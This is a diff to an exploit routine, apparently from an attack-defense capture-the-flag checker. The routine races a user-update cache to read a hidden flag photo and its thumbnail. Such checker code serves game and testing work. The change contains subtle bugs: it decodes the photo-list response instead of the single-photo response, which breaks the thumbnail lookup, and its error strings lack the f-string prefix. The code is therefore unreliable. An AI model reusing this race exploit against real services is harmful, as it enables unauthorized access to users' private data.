@@ -394,21 +394,24 @@ async def exploit_cache_race(
     for attempt in range(20):
         await user.update(conn, nu, cookies)
 
-        r = await conn.get(
-            f"/napi/users/{nu.name}/photos", cookies=cookies, timeout=15
-        )
+        r = await conn.get(f"/napi/users/{nu.name}/photos", cookies=cookies, timeout=15)
         if r.status_code != 200:
             continue
-        for pdata in r.json():
-            if "could be a flag but you cant see it" in pdata.get(
-                "description", ""
-            ):
+        try:
+            json = r.json()
+        except Exception as e:
+            raise MumbleException("couldnt decode json: {e}")
+        for pdata in json:
+            if "could be a flag but you cant see it" in pdata.get("description", ""):
                 pd = await conn.get(
                     f"/napi/photos/{pdata['public_id']}",
                     cookies=cookies,
                     timeout=15,
                 )
-                photo_data = pd.json()
+                try:
+                    photo_data = r.json()
+                except Exception as e:
+                    raise MumbleException("couldnt decode json {e}")
                 asset_id = photo_data["thumbnail"]["asset_id"]
                 data = await conn.get(
                     f"/images/photo-{asset_id}",
